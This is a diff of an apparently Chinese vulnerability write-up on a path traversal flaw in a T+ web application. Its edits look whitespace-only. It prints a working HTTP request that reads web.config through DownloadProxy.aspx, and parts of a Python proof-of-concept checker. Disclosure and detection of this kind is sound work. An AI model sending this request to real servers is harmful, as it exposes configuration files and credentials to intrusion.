@@ -47,7 +47,7 @@ http://xxx.xxx.xx.xxx:8080/tplus/view/login.html
 
 ```
 GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../web.config HTTP/1.1
-Host: xxx.xxx.xx.xxx:8080
+Host: xxx.xxx.xx.xxx:8080
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
@@ -77,8 +77,8 @@ poc：
 ```
 #!/usr/local/bin/python3
 # -*- coding: utf-8 -*-
-# @Time    : 2022/12/10 15:09
-# @Author  : zhang3
+# @Time    : 2022/12/10 15:09
+# @Author  : zhang3
 import requests
 import urllib
 import re
@@ -104,7 +104,7 @@ def verify(url):
             result['url']=url
             result['method']='GET'
             result['payload']=v_url
-            result['about']='https://github.com/xxx'
+            result['about']='https://github.com/xxx'
         return result
     except:
         return result
@@ -113,7 +113,7 @@ def verify(url):
 
 ```
 
-检测效果：   （工具的具体使用请移步原作者项目地址）  
+检测效果：   （工具的具体使用请移步原作者项目地址）  
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia7kWJlefpiaW49YyAtyfj1YMvppndvqIRqcoM7rVjL8iaHC6zY6vbwAeqoH4qKhGUn59hp7X8xPViaEw/640?wx_fmt=png)
 
